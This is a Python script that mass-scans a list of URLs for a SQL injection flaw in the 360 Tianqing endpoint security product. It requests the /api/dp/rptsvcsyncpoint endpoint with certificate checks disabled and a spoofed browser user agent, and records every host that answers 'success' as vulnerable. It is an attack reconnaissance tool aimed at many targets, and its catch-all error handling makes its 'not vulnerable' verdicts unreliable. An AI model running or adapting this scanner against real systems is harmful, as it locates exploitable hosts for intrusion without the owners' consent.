import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("360天擎.txt"):
    try:
        url = url.replace("\n", "")
        url=url+"/api/dp/rptsvcsyncpoint?ccid=1"
        print(url)
        print("检测中----\n\n")
        respense = requests.get(url,headers=headers,verify=False,timeout=5)
        print(respense.text)
        if "success" in respense.text:
            print("存在漏洞")
            with open("360天擎 rptsvcsyncpoint 前台SQL vul.txt", "a+") as f:
                             f.write(url+"\n")
    except:
        print("不存在漏洞")
